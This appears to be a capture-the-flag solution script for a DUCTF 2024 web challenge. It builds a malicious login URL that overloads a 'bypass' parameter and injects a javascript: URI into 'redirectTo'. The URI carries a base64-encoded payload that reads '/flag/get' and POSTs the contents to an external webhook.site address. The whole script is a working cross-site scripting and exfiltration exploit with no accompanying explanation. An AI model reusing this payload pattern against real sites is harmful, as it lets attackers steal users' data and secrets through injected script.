import base64

b64 = base64.b64encode(b"fetch('/flag/get').then(r => r.text()).then(text=>fetch('https://webhook.site/3e37a354-b43f-4e0a-8bdc-2bf1a5293e9f',{method:'POST',body:text}))").decode()

bot_url = "https://web-waifu-ea0bd3796efa3446.2024.ductf.dev"

url = "/auth/?bypass=" + "%61" * 400 + f"&redirectTo=javascript://127.0.0.1:3000/%250aeval(atob(%2522{b64}%2522))"
print(url) 
